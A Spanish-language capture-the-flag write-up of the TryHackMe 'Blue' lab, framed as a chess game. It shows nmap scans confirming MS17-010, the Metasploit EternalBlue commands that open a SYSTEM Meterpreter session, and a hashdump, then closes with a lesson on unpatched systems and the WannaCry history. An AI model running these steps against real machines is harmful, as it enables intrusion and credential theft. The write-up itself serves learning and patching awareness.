```
♟ PARTIDA 002
  BLUE
  TryHackMe · Easy · Windows
```

```bash
$ whoami
> t474_r0b07

$ cat /etc/context
> windows. smb. 2017.
> este exploit tiene nombre propio.
> y una historia detrás que el laboratorio no cuenta.
```

---

## `> ♟ APERTURA: lectura del tablero`

```bash
$ cat first_impression.txt
> una máquina windows en un laboratorio de principiantes.
> el nombre de la sala es Blue.
> el color no es casualidad.
```

> Blue. El nombre ya dice todo. Esta sala existe por un exploit que en 2017 comprometió hospitales, interrumpió servicios críticos y se propagó solo por redes enteras sin que nadie lo invitara. Aquí está empaquetado como laboratorio. Limpio. Controlado. Con los guiones ya escritos. La diferencia entre esto y lo que pasó en 2017 es solo el contexto. El mecanismo es exactamente el mismo.

---

## `> ♞ PIEZA EXPUESTA: reconocimiento`

```bash
$ nmap -sV -vv -p- <IP>

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows 7
```

> Puerto 445 abierto. SMB activo. Windows 7.
>
> Eso es suficiente. La partida ya tiene dirección.

```bash
$ nmap --script smb-vuln-ms17-010 -p 445 <IP>

Host script results:
VULNERABLE: MS17-010
  State: VULNERABLE
  Risk factor: HIGH
```

> Confirmado. El sistema no solo tiene el puerto abierto: tiene la vulnerabilidad documentada, parchada, pública desde hace años, todavía sin aplicar. La posición no se deterioró hoy. Se deterioró el día que alguien decidió no actualizar.

---

## `> ♝ HIPÓTESIS: línea de juego`

```bash
$ cat hypothesis.txt
> ms17-010 confirmado
> metasploit tiene el módulo exacto
> entrada directa como SYSTEM: sin escalada secundaria
> pregunta: ¿hay algo más interesante que el exploit obvio?
> respuesta: no. el sistema no dejó nada más.
```

> A veces la línea más directa es la correcta. No porque sea elegante. Porque el sistema no ofreció otra cosa.

---

## `> ♜ INICIATIVA: ruptura`

```bash
$ msfconsole
> use exploit/windows/smb/ms17_010_eternalblue
> set RHOSTS <IP>
> set LHOST <IP_ATACANTE>
> exploit

[*] Meterpreter session opened
```

> EternalBlue abusa de un desbordamiento en el protocolo SMB. El sistema acepta el paquete malformado, ejecuta código arbitrario, entrega sesión. Todo en segundos. La elegancia del exploit no está en lo que hace: está en que lleva años funcionando y los sistemas siguen sin parche.

---

## `> ♚ JAQUE MATE`

```bash
$ shell
$ whoami
  nt authority\system
```

> Sin escalada. Sin pivot. Sin segunda fase. La entrada fue directo al núcleo. El sistema entregó las llaves en el primer movimiento.

```bash
$ hashdump
> [hashes extraídos]

$ cat flag1.txt && cat flag2.txt && cat flag3.txt
> THM{[REDACTED]}
> THM{[REDACTED]}
> THM{[REDACTED]}
```

---

## `> ♜ ANÁLISIS DE LA PARTIDA: ¿dónde perdió el rey?`

```bash
$ cat postmortem.txt

MOVIMIENTO 1: windows 7 sin parche de seguridad MS17-010
MOVIMIENTO 2: puerto 445 expuesto sin filtrado
MOVIMIENTO 3: no hay movimiento 3
```

> Esta partida terminó en el reconocimiento. No en la explotación.
>
> Cuando el `nmap` devolvió `VULNERABLE: MS17-010` la partida ya estaba decidida. Lo que vino después fue mecánico. EternalBlue no requiere creatividad: requiere que el sistema no haya aplicado un parche que existe desde abril de 2017.
>
> El rey no cayó por una combinación táctica. Cayó por negligencia acumulada.

```bash
$ echo $LESSON
> un sistema sin parche no es un sistema desactualizado.
> es un sistema con la puerta abierta y el letrero puesto.
```

> Lo que hace interesante esta partida no es el exploit. Es la historia detrás. EternalBlue fue desarrollado por la NSA, filtrado por Shadow Brokers, y usado semanas después en WannaCry: el ransomware que paralizó el NHS en Reino Unido y afectó más de 200,000 sistemas en 150 países. Aquí está como laboratorio de principiantes. El mecanismo no cambió. Solo cambió el contexto.

---

> *partida 002 · blue · jaque mate confirmado*
> *→ [t474-r0b07](https://github.com/t474-r0b07)*

<!--
  el parche existía desde abril de 2017.
  la decisión de no aplicarlo también existía.
-->
